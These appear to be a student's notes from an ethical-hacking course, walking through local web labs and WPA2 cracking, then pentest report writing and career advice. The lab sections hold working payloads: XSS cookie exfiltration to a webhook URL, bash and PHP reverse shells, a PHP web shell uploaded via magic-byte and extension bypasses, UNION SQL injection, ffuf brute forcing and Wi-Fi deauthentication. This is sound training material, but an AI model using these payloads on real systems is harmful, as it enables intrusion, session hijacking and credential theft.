    it allows to <span style="color:#6666ff">attack</span><span style="color:#6666ff"> other users</span>
    
- <span style="color:#00b050">DOM-based:</span>
	- <span style="color:#6666ff">client</span> side has some -->  <span style="color:#6666ff">vulnerable JS</span>
	- this vulnerable JS uses -->      - <span style="color:#6666ff">untrusted inputs</span>
	                            - instead of having a vulnerability server side

#### Check if page is XSS vulnerable
- open the page
- open the console -->  `CTRL+shif+C`
- try:
	- `alert(1)`
	- `print()`
	- `prompt('hello')`

#### Other cool thing
in the console:
- `function logKey(event){ console.log(event.key) }`  -->   create a fz that print the event
- `document.addEventListener('keydown', logKey)`  -->  when press keys =>  execute the fz
  =>
  ![[Pasted image 20240307182831.png]]
  if I type something inside the webpage =>  it will be printend inside the console
  =>
 <span style="background:#fff88f"> imagine if we substitute the action inside the function that runs we press something</span>
 Es -->  we substitute with a fetch API

#### Attacks
##### DOM XSS 0x01
we have a input where we can add text
![[Pasted image 20240307183848.png]]

this is -->  DOM-based XSS
bc:
if you open the console -->  you can see that the served doesn't send request
=>
- it's happen entire locally
- the vulnerability is within the client
=>
it's a DOM-based XSS

let's try basic paylaod:
`<script> prompt(1) </script>`
![[Pasted image 20240307185329.png]]

this didn't work:
- even if it's added to the page
- the code is not called
=>
we need a trigger 

<span style="background:#fff88f">trigger example:</span>
`<img src=x onerror="prompt(1)">`
document tries to load x
=>
- it will throw an error
- on the error we can execute come JS
=>
<span style="color:#00b050">it works</span>

<span style="background:#fff88f">if it works try to redirect the user to another web page:</span>
`<img src=x onerror="window.location.href='https://google.com'">`

##### Stored XSS 0x02
first we need to:
setup a container for testing -->  this allow us to:
							- have multiple sessions open
							- test across different users
in this way:
we can check if the -->  XSS is stored
=>
follow these [[cheet#Firefox Multi-Account Containers|steps]]

Now:
- copy the lab URL
- Open Multi-account plugin > click on Container 1 => it will open a new page as "container 1"
- paste the URL in this new page =>  we can access the LAB as user1
- to the same for -->  Container 2

when you are testing for XSS:
you can first check for -->  <span style="color:#00b050">HTML injection</span>
=>
- `<h1> test </h1>`
  ![[Pasted image 20240308105757.png]]
=>
it works

=>
let's try with:
- `<script> prompt(1) </script>`
  it works
  =>
	- <span style="background:#fff88f">try to refresh the page for Container 2 session</span>
	  =>
	  you'll see that -->  <span style="color:#00b050">the prompt will open even for the second user</span> 
	  =>
	  every user that will come to this page -->  it will affected by this injection

##### XSS 0x03
- set up [[cheet#Firefox Multi-Account Containers|firefox multicontainer plugin]]
- open 2 page as the 2 containers
	- into container 2 connect to -->  http://localhost/labs/x0x03_admin.php
goal:
- still the admin cookie
- don't popup in alert box -->  but EXFILTRATE IT
  =>
	- from container 1 -->  we will create the payload
	- from container 2 -->  we will trigger the payload  

=>
if you send some data from the input -->  you'll see it inside the admin page
=>
let's try with HTML injection:
 `<h1> test </h1>`
 -->  <span style="color:#00b050">both input are vulnerable</span> 

###### Popup Cookies
let's first popup the cookie:
`<script> alert(document.cookie)</script>`
=>
if you refresh the container 2 -->  <span style="color:#00b050">you'll see a popup with the admin cookie</span> 
=>
###### Exfiltrate Cookies
- open [[cheet#Webhook.site|WebHook website]]
- copy the unique URL
- at the end of it -->  `/?`
- type in the vulnerable input
  `<script> var i = new Image; i.src="https://webhook.site/a67abe7f-f8f9-44af-bf90-6f29be6fd833/?"+document.cookie; </script>`
- refresh the admin page
- <span style="color:#00b050">we got the cookie</span> 
  ![[Pasted image 20240308113410.png]]


### Command Injection
<span style="background:#fff88f">serious vuln:</span>
bc if you find it => you can:
                  - <span style="color:#00b050">compromise the entire app</span>
                  - <span style="color:#00b050">compromise the host</span> 
how it works:
- the app takes an input from the user
- pass that into a -->  function 
- the function --> executes it as code

#### Basic - 0x01
- open the first lab
- we have a network check:
	- if we type an URL we get:
		- the command that the site executes
		- the result
		- ![[Pasted image 20240308114321.png]]

- open the [[cheet#AppSecExplained|App Sec explained]] -->  and check for Injection > Command Injection

##### Basic command
<span style="background:#fff88f">basic command injection:</span>
`; ls -la`
`&& ls -la`
`; ls -la #`
`| ls -la`
`' or 1=1-- -`
```bash
; sleep 10
; ping -c 10 127.0.0.1
& whoami > /var/www/html/whoami.txt &
```

```bash
& nslookup webhook.site/<id>?`whoami` &     -->  out of band testing
```

=>
let's try the first one
`https://google.com; whoami`
![[Pasted image 20240308120816.png]]
=>
the command that is executed is -->  `curl -I -s -L https://google.com; whoami | grep "HTTP/"`
=>
let's try to:
- don't use the URL 
- grep command fails

=>
`; whoami; asd`
![[Pasted image 20240308121011.png]]
<span style="color:#00b050">it works</span> 

=>
we found a way to command injection:
=>
let's try to see the content:
`; ls -lah; asd`
>[!tips]
>if you have a bad formatted output
>=>
>press CTRL+U in the page to see -->  the source code
>=>
>to see also better -->  the output

=>
for example with the last command:
![[Pasted image 20240308121336.png]]

<span style="background:#fff88f">list user:</span>
`; cat /etc/passwd; asd`
![[Pasted image 20240308121532.png]]

this is already a -->  serious vuln
but:
let's try to popup a shell

##### Popup a shell
let's try with a bash shell:
- find the bash location -->  `; which bash; asd`
  ![[Pasted image 20240308135813.png]]
- connect to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)
	- CTRL+F and search for -->  Reverse Shell Cheatsheet 
	- click on bash TCP
	- copy the first one
- let's try it:
	- on your terminal setup netcat -->  `nc -nlvp 4444`
	- inject the payload :
	  `; bash -i >& /dev/tcp/<attacker-IP>/4242 0>&1; asd `
	  it doesn't work
=>
let's find what services are running in the webserver using -->  `which`
- check PHP -->  `; which php; asd` 
  =>
let's try a PHP shell:
- from  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master) > Reverse Shell Cheatsheet -->  search for PHP
- `nc -nlvp 4444`
- `; php -r '$sock=fsockopen("172.17.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'; asd`
	- `172.17.0.1` -->  my IP (interface docker0)
=>
<span style="color:#00b050">WE HAVE A SHELL</span>
![[Pasted image 20240308135212.png]]

>[!tips] Best Practice
>- use the full path for binaries  (ex `/bin/sh`)
>- use a different port (not 4444) -->  bc something fails
>	- try common port -->  80/8080/443
>

#### Blind / Out-of-Band 0x02
same things, but here we don't see the commands executed
=>
it's blind
Example:
if we search a website
![[Pasted image 20240308142418.png]]
if we search a website that doesn't exist =>  we get NotFound
=>
let's try with:
`https://google.com; whoami;`
it doesn't give us the command -->  but return Website OK anyway

##### WebHook
- open Webhook in the browser  ([[cheet#Webhook.site]])
- copy the unique URL
- insert the URL + ?\`command\`
```
https://webhook.site/a67abe7f-f8f9-44af-bf90-6f29be6fd833?`whoami`
```
- open webhook and see if you can see the output of the command
  <span style="color:#00b050">YES we have it</span>
	![[Pasted image 20240308143557.png]]


##### Trigger new line
here the OS is linux =>  let's try to trigger new line
`python3 -m http.server 8080` -->  setup a web server from the attacker
`https://google.com \n wget 172.17.0.1:8080/test`  -->  try to trigger a new line and retrieve 
                                                   something from the webserver
<span style="color:#00b050">It works</span> (404 not found bc we don't have any "test")
![[Pasted image 20240308144152.png]]
=>
we can:
- create a reverse php shell
- put it inside our python3 http server
- try to retrieve from the victim through the vulnerable input

##### Get a shell
- search on google -->  [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
- copy it locally and change the IP and the port
- `chmod +x rev.php`
- open a web server from this directory -->  `python3 -m http.server 8080`
- try to retrieve the shell as before:
  `https://google.com \n wget 172.17.0.1:8080/rev.php`

- otherwise try:
  `https://google.com && curl 172.17.0.1:8080/rev.php > /var/www/html/rev.php`
	![[Pasted image 20240308150121.png]]
  now:
	- open new tab and setup a listener -->  `nc -nvlp 444`
	- open new browser page and search -->  localhost/rev.php
	  ![[Pasted image 20240308150350.png]]
	  
	  <span style="color:#00b050">We have our shell!</span>

#### Command injection 0x03
goal -->  popup a shell
This is our input
![[Pasted image 20240308152423.png]]

Let's try to inject in the last one
- the command ends as an `'`
	- we can try to put as last parameter -->  `';whoami;`
		- this don't work but we don't have an error
		  =>
		- try with -->  `';whoami;#`     (to don't execute the last line)
		  _<span style="color:#00b050">it works</span> 
		  ![[Pasted image 20240308152942.png]]

Now we want a shell:
- `';which php;#` -->  php is available and is in `/usr/local/bin/php`
  =>
<span style="background:#fff88f">we can spawn a php shell:</span>
- `nc -nlvp 4444` -->  setup a listener
- grab a php payload from -->  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)
- `';php -r '$sock=fsockopen("172.17.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");';#`
  _<span style="color:#00b050">WE HAVE A SHELL </span> 


### File upload
#### Basic Bypass 0x01
let's understand how this file upload works:
first we can try to upload a txt file:
- `echo "test" > test.txt`
- it doesn't work --> prompt the user that are acceptable only png and jpg

check the calls to the webserver:
- open the dev tool -->  `CTRL+ALT+C`
- go to Network
- Reload the page
- Upload again the txt file
- check if the app is doing some checks (here only png and jpg)

###### BurpSuite
- download an image
- Setup initial things for BurpSuite -->  [[cheet#Initial things to do]]
- upload the img to the webserver
- open the req into Burp
- Send it to Repeater (CTRL+R)
- <span style="background:#fff88f">We want to verify if the check that server performed happens only client Side or also Server:</span>
  =>
	- delete the img from the req    (select all the img, not like in the screen)
	  ![[Pasted image 20240309102311.png]] 
	- put some text instead 
	- change the filename to -->  .txt
	- click Send
	  ![[Pasted image 20240309104829.png]]
	  =>
		- <span style="color:#00b050">we obtain 200 OK</span> and into the response there is the mex -->  "file is been uploaded"
		- you can check by refreshing the page
		  =>
		  <span style="color:#00b050">THE CHECK IS PERFORMED ONLY CLIENT SIDE</span>   (here we could sent the .txt)
=>
we can:
- create a PHP web shell
- upload it into the webserver

###### PHP shell
Now -->  instead of sending random text with burp =>  we send a php shell
=>
`<?php system($_GET['cmd']); ?>`
`$_GET` -->  this is going to get the value of the parameter inside the `[]` and send a GET request
`system()` -->  function that executes what it has inside

also:
we need to change the file type of our new req:
`cmd.php` -->  bc the file that we want to upload must be executable
![[Pasted image 20240309104930.png]]

let's send this:
=>
	<span style="color:#00b050">we obtain 200 OK and the file is been uploaded</span>   (check by refreshing the page)
now:
<span style="background:#fff88f">we need to find where this file is been uploaded</span>
=>
we can do:
-  <span style="color:#00b050">guessing</span>
   you can inspect the code to see where the other img in the webserver are stored
   ![[Pasted image 20240309103801.png]]
   =>
   let's try to see if the img is in -->  http://localhost/assets/cmd.php
   NO is not here
-  directory busting (ex [[cheet#dirb]])
   `dirb  http://localhost/`
   ![[Pasted image 20240309104419.png]]
   =>
   inside `labs` there is a directory -->  `uploads`
   =>
   let's try -->  http://localhost/labs/uploads/cmd.php
   ![[Pasted image 20240309105028.png]]
   _<span style="color:#00b050">It works</span> 
   We got an error bc -->  <span style="background:#fff88f">we didn't pass the parameter cmd with a value</span>
   =>
   `http://localhost/labs/uploads/cmd.php?cmd=whoami`
   ![[Pasted image 20240309105301.png]]
   =>
   _<span style="color:#00b050">WE PERFORMED CODE EXECUTION</span> 

now we can try to popup a shell
###### Popup a shell
aa


####  Magic Bytes 0x02
upload an image and txt file to test the webserver =>  the webserver only accept png and jpg
=>
<span style="background:#fff88f">let's bypass this protection with BurpSuite: </span>(as in the previous lab)
- Turn on [[cheet#FoxyProxy]]
- Setup initial things for BurpSuite -->  [[cheet#Initial things to do]]
- upload the img > open the req in burpSuite > Send to Repeater
- delete the img, change file type to `.php` and try to send our [[Notes_ETH#PHP shell|PHP shell]]
  `<?php system($_GET['cmd']); ?>`
	- this time we have an error =>  <span style="color:#00b050">CHECK HAPPENS server side </span> 
	=>

<span style="background:#fff88f">we need to understand where the app checks for this control:</span>
the app could:
- <span style="color:#00b050">look at the file extension </span>  (filename="file.<span style="color:#00b050"><u>php</u></span>")
  how to bypass this:
  `filename="file.php%00.png"`
  `%00` -->  is a NULL byte => it ends the string
  
  `filename="file.php.png"`
  sometimes if the app is not well configured -->  also this can bypass the check
  
- <span style="color:#00b050">check the Magic bytes</span>
##### Bypass Check Server-Side (Magic Bytes)
magic bytes -->      - first bytes of a file
                - they tell the system what type of file it is
Example:
![[Pasted image 20240310115626.png]]

=>
on BurpSuite:
- click the `<` (back arrow) -->  to turn back to the original request
- insert our payload few lines after the magic bytes -->  `<?php system($_GET['cmd']); ?>`
- change the filetype to php
  =>
  do something like this:![[Pasted image 20240310120747.png]]
  >[!warning]
  >you need to play a little bit on where to put the shell
  >maybe after the magic bytes, after 2/3 lines, you need to delete part of the img (as we did)

- Send the request
  =>
  _<span style="color:#00b050">The file is been uploaded</span>
  
Now we should do -->  directory busting (to find where the file is been uploaded)
                     but we already know that
=>
let's connect to 
`http://localhost/labs/uploads/Example2.php?cmd=COMMAND`
and see if it worked:
![[Pasted image 20240310121100.png]]
<span style="color:#00b050">IT WORKED</span> 

###### Bypass also File Extension Check Server Side

  >[!warning] If the Server checks the file extension inside the namefile
  >=>
  >try to google -->  valid php file extension
  >=>
  >you'll find other extension -->  that can execute php anyway
  >![[Pasted image 20240310121409.png]]
  
  
  


#### File Upload 0x03
- turn on FroxyProxy
- do the [[cheet#Initial things to do]] for BurpSuite
- upload an img
- open it inside Proxy > HTTP History
- Send to Repeater
	- Insert our shell inside the image after the magic bytes and delete a portion of it
	- change the filetype to php
	- <span style="color:#00b050">WE GOT AN ERROR</span> -->  here the server checks that you upload only jpg and png
	=>
	- google -->  valid php file extension
	- retry with different extension
	- <span style="color:#00b050">with phtml works</span>
		 ![[Pasted image 20240310124834.png]]
		=>
		![[Pasted image 20240310124911.png]]



### Attacking Authentication
we can test 2 things:
- bruteforcing
- logical issues
#### auth bruteforce 0x01
If you are attacking a liver target:
=>
- the attack can be slow =>  don't use a huge wordlist
- maybe the target allows only 4-5 req per second =>  you need to stay inside this interval

you can use for bruteforcing:
- BurpSuite -->  but you need PRO version
- ffuf

##### ffuf
First  we need to capture a clean req:   (=> we need burp anyway)
=> 
- Setup initial things for BurpSuite -->  [[cheet#Initial things to do]]
- send some random credentials
- open the req into Burp > Copy it > Save it inside a txt file
  ![[Pasted image 20240310130154.png]]
- change the password value as -->  your fuzz variable
- we need a not huge wordlist:
  =>
  `git clone --depth 1 \
  https://github.com/danielmiessler/SecLists.git`
- `ffuf -request req.txt -request-proto http -w /home/simone/Desktop/TCM/wordlist/SecLists/Passwords/xato-net-10-million-passwords-10000.txt`
- We need to filter the result
  =>
  check the Size in the output of ffuf and:
  `ffuf -request req.txt -request-proto http -w /home/simone/Desktop/TCM/wordlist/SecLists/Passwords/xato-net-10-million-passwords-10000.txt -fs <Size_number>`
  =>
=>
<span style="color:#00b050">password found</span> 
![[Pasted image 20240310132112.png]]

#### MFA 0x02
- Open the lab
- Enter the credentials that the lab provided
- => you'll get a MFA code to complete the login > insert it and you'll be logged in
  ![[Pasted image 20240310150530.png]]
=>
- Reload the page
- login again
- copy the new Code
- put it inside the MFA box
- Open BurpSuite
- enable FoxyProxy

##### Intercept and Edit req BurpSuite
- go to Proxy > Intercept > Intercept On
- now click the Submit button into the lab
- Now you have captured the request inside BurpSuite
  =>
  the req is not been sent
  =>
  modify the useraname to -->  jeremy    (that is our target)
  ![[Pasted image 20240310151812.png]]

- click on Intercept Off (it will send the request)
- now go back to the page -->  <span style="color:#00b050">We have access as Jeremy</span>
  ![[Pasted image 20240310151842.png]]

#### auth 0x03
after 5 attempts -->  account will block
=>
we will test only 4 passwords for each possible account
=>
Copy one single request with Burpsuite:
- turn on FoxyProxy
- Setup initial things for BurpSuite -->  [[cheet#Initial things to do]]
- send as credentials -->  admin:admin
- open the req into Burp 
- <span style="color:#00b050">Save the response Length </span>-->  (3376)
- Copy the req > Save it inside a txt file
- modify the 2 parameters:
	- `username=FUZZUSER`
	- `password = FUZZPASS`
	  
Create a txt file with 4 passwords -->  123456, password, letmein, teashop

##### ffuf
`ffuf -request req.txt -request-proto http -mode clusterbomb -w passwords.txt:FUZZPASS -w /home/simone/Desktop/TCM/wordlist/SecLists/Usernames/top-usernames-shortlist.txt:FUZZUSER -fs 3376`     
`-mode clusterbomb` -->  for each username it tries everypassword
`-fs 3376` -->  length of the response that we captured
=>
now in the output find an attempts that have a different size value as what we specified
=>
<span style="color:#00b050">We found a possible login</span> 
![[Pasted image 20240310154953.png]]
=>
<span style="color:#00b050">it works</span> 

### XXE - External Entities Injection
Some apps use XML -->  to transfer data

Inside our lab `peh-web-labs/labs/user-content/`:
there are 2 xml files:
- <span style="color:#00b050">a legitimate xml file</span>![[Pasted image 20240310160128.png]]
- <span style="color:#00b050">a xml file that contains an exploit </span> (print the /etc/passwd file) ![[Pasted image 20240310160227.png]]

<span style="background:#fff88f">What does the second file:</span>
the external entity `xxe` that is inside the `creds` document:
is going to reference -->  `SYSTEM "file:///etc/passwd"`
=>
when this file is passed -->    - the contents of it will be grabbed
                         - and it will be place where xxe is
                           our reference to xxe is inside the `<user> </user>` field:
                           `<creds><user>&xxe;</user><password>pass</password></creds>`
=>
if we upload this file:
![[Pasted image 20240310160926.png]]
<span style="color:#00b050">we'll get the /etc/pass file </span>    (to see better format => `CTRL+U` )

### IDOR - Insecure Direct Object Reference
IDOR -->  Insicure Direct Object Reference
it's:
an <span style="color:#00b050">access control issue</span> where:
- we can request a resource with an obj ID
- server will return some info of the obj

<span style="background:#fff88f">easiest way to test IDOR:</span>
find a way where you are able to -->  manipulate an obj ID

in our lab:
we can do it through the -->  URL
![[Pasted image 20240310170434.png]]

if we change this value =>  we'll get another account info
=>
let's enumerate all the possible accounts

##### Enumerate all the possible accounts (ffuf)
first we need a wordlist
we can create it with python:
insert n° from 0 to 2000 -->  `python3 -c 'for i in range(1,2001): print(i)' > num.txt`
![[Pasted image 20240310170919.png]]

=>
copy the lab URL
`ffuf -u "http://localhost/labs/e0x02.php?account=FUZZ" -w num.txt`
we need the `""` -->  bc inside the URL there is the `?`

in this way -->  we'll get a lot of result  (also all the n° that don't correspond to a valid ID)
=>
filter the result via the size:
- check the size in the ffuf output 
- `ffuf -u "http://localhost/labs/e0x02.php?account=FUZZ" -w num.txt -fs <size>`
  =>
  ![[Pasted image 20240310171521.png]]

=>
let's try to connect to the first one: (1008)
![[Pasted image 20240310171602.png]]
<span style="color:#00b050">we found an admin account</span> 
=>
we can automate this process and writing a script to find -->  all the admin accounts
## Capstone
- created an account
- logged in

### Enumerate the website - Capstone
`dirb http://localhost/capstone/`
![[Pasted image 20240310185234.png]]
=>
<span style="color:#00b050">we found a admin page </span>-->  http://localhost/capstone/admin/admin.php

### SQL Injection - Capstone
- tested if there are potential SQL injection in the input
- also with Burp and Repeater
#### sqlmap - Capstone
- copy a clean request from the -->  Add Rating feature
- save it inside a txt file
- `sqlmap -r req_review.txt --dump`
  ![[Pasted image 20240310173954.png]]
#### Manual - Capstone
if you type after the URL -->  '`' or 1=1-- -`
=>
the page returns all the coffies

##### UNION - Capstone
let's try using union
<span style="background:#fff88f">first we need to find the n° of columns</span>
at least we have 7 columns -->  ovvero coffe name, Scoring, Region, Notes, Varietal, Customer rating, Scoring, Region, Notes, Varietal
=>
with 7 null it works:
`' union select null, null, null, null, null, null, null-- -`

<span style="background:#fff88f">figure out which column is which output:</span>
`' union select null, 'string', null, null, null, null, null-- -`
![[Pasted image 20240310183059.png]]
=>

<span style="background:#fff88f">find tables:</span>
`' union select null, TABLE_NAME,null, null, null, null, null FROM INFORMATION_SCHEMA.TABLES-- -`
![[Pasted image 20240310183431.png]]

<span style="background:#fff88f">find columns of users table:</span>
`' union select null, COLUMN_NAME,null, null, null, null, null FROM INFORMATION_SCHEMA.COLUMNS-- -`
=>
there are the columns -->  username and password
<span style="background:#fff88f">find username and password:</span>
`' union select null, username,password, null, null, null, null FROM users-- -`
![[Pasted image 20240310183857.png]]

#### Crack the passwords (hashcat)
save into a file the jeremy and jessamy passwords

<span style="background:#fff88f">find the hashtype:</span>
[site](https://hashes.com/en/tools/hash_identifier)
![[Pasted image 20240310184314.png]]
=>
it's a -->  blowfish hash
=>
search on google the blowfish mode for hashcat  (is 3200)
=>
`hashcat -m 3200 passwords.txt /home/simone/Desktop/TCM/wordlist/SecLists/Passwords/xato-net-10-million-passwords-10000.txt`
<font color="#2DC26B">we found the jeremy password</font>
![[Pasted image 20240310184927.png]]

now:
<span style="background:#fff88f">login with this credentials and try to access to the admin page that we found before:</span>
=>
here we can upload a new coffe (<span style="color:#00b050">and also an image</span>)

### File Upload - Capstone
#### Shell - Capstone
- turn on FoxyProxy
- Setup initial things for BurpSuite -->  [[cheet#Initial things to do]]
- upload a new coffe through the admin page
- open the req inside burp > send it to Repeater
-  Insert our shell inside the image after the magic bytes and delete a portion of it
   `<?php system($_GET['cmd']); ?>`
-  change the filetype to php
- click on Send 
  =>
  ![[Pasted image 20240310190447.png]]
 _<span style="color:#00b050"> the image is been uploaded</span>
	
now:
refresh the home page and see the new coffee that you've uploaded
- `CTRL+SHIFT+C` -->  to open the dev mod
	![[Pasted image 20240310190848.png]]
- <span style="background:#fff88f">check where the img is been uploaded</span> -->  `/assets/10.png`
  =>
  try to connect to it:
  `http://localhost/capstone/assets/10.php`
	![[Pasted image 20240310190928.png]]
=>
<span style="background:#fff88f">let's add our parameter:</span>
  `http://localhost/capstone/assets/10.php?cmd=whoami`
  ![[Pasted image 20240310191102.png]]
### XSS - Capstone
when you login:
the mex that you see in the website is also reflected in the URL
=>
![[Pasted image 20240310181649.png]]

it's  XSS reflected vulnerable:
`<script> prompt(1) </script>`
![[Pasted image 20240310181735.png]]

<span style="color:#00b050">comment input is vulnerable to XSS:</span>
- if you try with `<script> prompt(1) </script>` -->  it opens the prompt
=>
it's a <span style="color:#00b050">stored XSS</span> -->  bc if you setup [[cheet#Firefox Multi-Account Containers]]
                   =>
                   and open the same pag as a new user -->  you'll get the same prompt

with:
`<script> alert(document.cookie)</script>` 
<span style="color:#00b050">we got a PHP SESSION cookie</span> -->  PHPSESSID=67470273aacacd80dc05b4642f824808


### Authentication attack - Capstone
Copy one single request with Burpsuite:
- turn on FoxyProxy
- Setup initial things for BurpSuite -->  [[cheet#Initial things to do]]
- send as credentials -->  admin:admin
- open the req into Burp 
- <span style="color:#00b050">Save the response Length </span>-->  (3376)
- Copy the req > Save it inside a txt file
- we already found some admin account =>  we'll fuzz only the passwords
- `password = FUZZPASS`
![[Pasted image 20240310180653.png]]
=>
`ffuf -request req_login.txt -request-proto http -w /home/simone/Desktop/TCM/wordlist/SecLists/Passwords/xato-net-10-million-passwords-10000.txt:FUZZPASS`



# Wireless Penetration Testing

## What is
### Assessment of wireless network
- <span style="color:#00b050">WPA2 PSK</span> -->  use inside homes
- <span style="color:#00b050">WPA2 Enterprise</span> -->  use inside company
=>
we'll focus on WPA2 PSK       (bc build a lab for Enterprise is expensive)ù

### Activities performed
- evaluating strength of PSK
- reviewing nearby networks
- assessing guest networks
- checking network access

### Tools
- Wireless card -->  to inject data
- router
- laptop connected to the router   (to test deauthentication attack)

## Hacking process WPA2 PSK
![[Pasted image 20240311103027.png]]

## Attacks
### aircrack-ng
plugin wireless card
`airmon-ng check kill` -->  checks if there are some process that could interface and kills them
`airmon-ng start wlp4s0` -->  put card in monitor mode
monitor mode -->  <span style="background:#fff88f">allows us to:</span>
                 - monitoring all incoming traffic
                 - eavesdrop
                 - capture the handshake

`airodump-ng wlp4s0mon` -->  finds the available wifi in the area
`BSSID` -->   MAC address of the access point
`PWR` -->  power level   (closest n° to 0 are the nearest networks)
`CH` -->  channel on which the access point is working
`ENC` -->  type of access point
`AUTH` -->  type of auth

`CTRL+C`  -->  to stop airodump

`airodump-ng -c 6 --BSSID <XXXX> -w capture_file wlp4s0mon
`-c` -->  ch on which your target wifi is run 
`--bssid` -->  BSSID of the target wifi
`-w capture_file` -->  specify the file where you want to save your captured data

here -->  we are capturing some data to try to catch the handshake

To speed up this process we can -->  <span style="color:#00b050">deauthenticate the client</span>
=>
the client must reconnect do the wifi
=>
we can capture the handshake

#### De-authentication Attack
open a new tab
`aireplay-ng -0 1 -a <BSSID> -c <STATION> wlp4s0mon`
`-0` -->  means deauthentication attack 
`1` -->  run only one time
``-a <BSSID>`` -->  BSSID of the client you want to deauthenticate
`-c <STATION>` -->  n° of the station you want to deauthenticate   
                is next to the BSSID in the airodump output)
>[!info]
>you might need to run this attack multiple time (maybe with different client)
>=>
>when you see the `WPA HANDSHAKE` in the airodump output =>  <span style="color:#00b050">you made it</span>

#### airodump
When you capture the handshake in the airodump output
=>
press `CTRL+C`
![[Pasted image 20240311110621.png]]

`aircrack-ng -w wordlist.txt -b <BSSID> capture_file.cap`
`-w wordlist.txt` -->  wordlist with all the possible passwords
`-b <BSSID>` -->  BSSID of the client  (the second one in the img above)
`capture_file.cap` -->  the output file of your airodump process

<span style="color:#00b050">PASSWORD FOUND</span>
![[Pasted image 20240311111109.png]]

`sudo systemctl start NetworkManager` -->  start again the wifi 
# Legal Documents and Report Writing
<span style="background:#fff88f">3 main sections</span>
![[Pasted image 20240311111433.png]]
<span style="color:#00b050">As a pentester:</span>
you probably will see only -->  ROE and Finding Report

let's discuss all of them:

## Sales
### Mutual Non-Disclosure Agreement (NDA)
NDA -->  <span style="color:#00b050">it simply says that:</span>
         - no one from both side will take anything learned with this work and 
         - disclose it to anybody else
        =>
        can't go to to say to someone the technologies/vulnerab/other things of a client

### Master Service Agreement (MSA)
MSA -->  contractual document
         it specifies:
         - <span style="color:#00b050">performance objectives</span>
         - <span style="color:#00b050">responsibilities of both the parties</span>

### Statement of Work (SOW)
SOW -->   specifies:
         - <span style="color:#00b050">activities</span>
         - <span style="color:#00b050">timelines</span>
         - <span style="color:#00b050">how much is going to pay</span>

<span style="color:#00b050">Example:</span>
in this assignment I'm going to perform a wireless pentesting and is going to cost you that money
=>
if the client accepts =>  he will sign the SOW

### Others
Sample Report
## Before you test
### Rules of Engagement (ROE)
ROE -->  <span style="color:#00b050">it specifies what you can and what you can't do </span>

example:
- which IP you can attack
- usually you can't do -->  DoS, Social Engineering (it does in separate engagement)

## After you yest
### Finding Report
Finding Report -->  <span style="color:#00b050">what you found from a high level and a technical level</span>


## Pentest Report Writing Sample
you can find the samples inside the -->  `Pentest_reports` folder

<span style="background:#fff88f">Confidentiality Statements:</span>
says that this document is only for the company that made the pentest and no one else

<span style="background:#fff88f">Disclaimer:</span>
if the pentest was a 1 week job
=>
if a finding comes up a week later or someone opens up a port or setup an app badly
=>
we are not responsible for that

Also:
if you have a limited time =>  you won't find everything
and this is also written inside the disclaimer

<span style="background:#fff88f">Assessment Overview:</span>
it tells how the work is been performed

<span style="background:#fff88f">Assessment Components:</span>
who is been attacked

<span style="background:#fff88f">Finding Severity Ratings:</span>
rate the severity of the vulnerabilities found

<span style="background:#fff88f">Executive Summary:</span>
Summary for CISO or CEO
=>
probably the don't have a technical background
=>
you need to explain in a very basic way what you found -->  so they can understand

inside this section there is also the:
- Attack Summary and Recommendation
- Security Strengths and Security Weakness
- Impact of the vulnerabilities found

<span style="background:#b1ffff">Attack Summary and Recommendation:</span>
describes each attack and the recommendation 
	 
<span style="background:#b1ffff">Security Strengths and Security Weakness:</span>
example -->  missing multi factor auth, weak password policy, unrestricted logon attempts

<span style="background:#b1ffff">Impact of the vulnerabilities found</span>

<span style="background:#fff88f">Technical Summary:</span>
Summary of all the vuln and attacks in technical words
also -->  technical remediation
=>
it's the same as the Executive Summary -->  but in technical

# Career Advice
![[Pasted image 20240311123244.png]]
Don't become complacent =>  don't feel like that you arrived at the end
there is always something else:
- that you can learn
- other job

keep studying and keep searching for new job

<span style="background:#fff88f">NEVER BE AFRAID TO APPLY JOBS YOU'RE UNQUALIFIED FOR:</span>
often job descriptions/requirements are ridiculous 
bc:
they ask for a super hero
=>
if you find a interesting job =>  apply for it
                           in a bad scenario you will be rejected
                           BUT:
                           you'll understand what you need to study/learn to achieve this job







